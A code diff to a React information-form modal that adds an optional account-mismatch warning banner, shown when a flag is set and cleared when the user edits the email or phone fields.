@@ -8,11 +8,19 @@ import { useAppStrings } from '@/hooks/useAppStrings';
 
 interface InfomationsModalProps {
   isOpend: boolean;
+  accountMismatchActive?: boolean;
+  onClearAccountMismatch?: () => void;
   onInfoValidated: () => void;
   onToggleModal: (isOpen: boolean) => void;
 }
 
-const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, onInfoValidated, onToggleModal }) => {
+const InfomationsModal: React.FC<InfomationsModalProps> = ({
+  isOpend,
+  accountMismatchActive,
+  onClearAccountMismatch,
+  onInfoValidated,
+  onToggleModal,
+}) => {
   const t = useAppStrings();
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
   const normalizePhoneDigits = (value: string) => value.replace(/\D/g, '');
@@ -27,6 +35,9 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, onInfoVali
     const { id, value } = e.target;
     dispatch(updateForm({ [id as keyof FormData]: value } as Partial<FormData>));
     setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
+    if (accountMismatchActive && (id === 'email' || id === 'emailBusiness')) {
+      onClearAccountMismatch?.();
+    }
   };
 
   React.useEffect(() => {
@@ -101,6 +112,13 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, onInfoVali
       <div className="flex min-h-full min-w-0 w-full flex-col">
         <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
           <div className='w-full'>
+            {accountMismatchActive ? (
+              <div className='mb-[14px] rounded-[12px] border border-[#fad4d4] bg-[#fff5f5] px-[12px] py-[10px]'>
+                <p className='text-[13px] leading-[1.55] text-[#b42318]'>
+                  {t.captcha.accountCheckNoneLinked}
+                </p>
+              </div>
+            ) : null}
             <div className='mb-[14px] rounded-[12px] border border-[#dbe6fb] bg-[#f5f9ff] px-[12px] py-[10px]'>
               <p className='text-[13px] leading-[1.55] text-[#33507f]'>
                 {t.info.hint}
@@ -167,6 +185,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, onInfoVali
                   const normalizedPhone = normalizePhoneDigits(phone).slice(0, 15);
                   dispatch(updateForm({ phone: normalizedPhone }))
                   setErrors(prev => ({ ...prev, phone: '' }))
+                  if (accountMismatchActive) onClearAccountMismatch?.();
                 }}
                 inputProps={{
                   name: 'phone',
